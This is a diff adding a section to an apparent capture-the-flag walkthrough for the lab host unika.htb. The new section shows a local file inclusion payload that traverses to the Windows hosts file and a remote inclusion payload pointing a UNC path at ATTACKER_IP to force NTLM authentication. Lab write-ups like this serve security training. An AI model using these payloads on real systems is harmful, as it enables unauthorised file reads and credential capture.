@@ -146,6 +146,31 @@ We can also observe, through the **Wappalyzer** extension, the technologies used
 
 ![WhatWeb](img/wappalizer.jpg)
 
+## Vulnerability Discovery – LFI & RFI
 
+The application loads content via a page parameter, for example, there's a language selector on the website http://unika.htb.
+
+If you look at the URL, you'll see something like::
+
+<pre> index.php?page=english.html </pre>
+
+![Parameter Page](img/parametro-page.jpg)
+
+This behavior indicates a file inclusion vulnerability.
+
+**Local File Inclusion (LFI)**
+
+Example payload:
+
+<pre>../../../../../../windows/system32/drivers/etc/hosts</pre>
+
+**Remote File Inclusion (RFI)**
+
+Since the server is Windows-based, we can leverage UNC paths:
+
+<pre>//ATTACKER_IP/test</pre>
+
+
+**This forces the server to authenticate to our machine using NTLM.**
 
 
